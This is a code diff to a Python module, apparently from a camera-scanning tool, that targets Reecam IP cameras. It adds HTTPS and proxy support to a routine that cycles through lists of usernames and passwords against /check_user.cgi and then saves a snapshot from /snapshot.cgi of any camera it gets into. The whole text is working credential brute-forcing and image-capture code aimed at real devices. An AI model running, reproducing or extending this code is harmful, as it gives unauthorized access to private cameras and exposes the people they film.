@@ -15,18 +15,22 @@ class ReecamWeakPassword(POCTemplate):
         self.ref = ''
         self.level = POCTemplate.level.low
         self.desc = """"""
-        self.headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}
 
     def verify(self, ip, port=80):
+        from .base import get_scheme
+        scheme = get_scheme(port)
+        headers = self._get_headers()
+        proxies = self._get_proxies()
         for user in self.config.users:
             for password in self.config.passwords:
                 try:
                     r = requests.get(
-                        url=f"http://{user}:{password}@{ip}:{port}/check_user.cgi",
+                        url=f"{scheme}://{user}:{password}@{ip}:{port}/check_user.cgi",
                         timeout=self.config.timeout,
-                        headers=self.headers,
+                        headers=headers,
                         verify=False,
-                        stream=True
+                        stream=True,
+                        proxies=proxies
                     )
                     if r.status_code == 200:
                         return ip, str(port), self.product, str(user), str(password), self.name
@@ -35,9 +39,11 @@ class ReecamWeakPassword(POCTemplate):
         return None
 
     def exploit(self, results):
+        from .base import get_scheme
         ip, port, product, user, password, vul = results
+        scheme = get_scheme(port)
         img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
-        url = f"http://{user}:{password}@{ip}:{port}/snapshot.cgi"
+        url = f"{scheme}://{user}:{password}@{ip}:{port}/snapshot.cgi"
         return self._snapshot(url, img_file_name)
 
 POCTemplate.register_poc(ReecamWeakPassword)
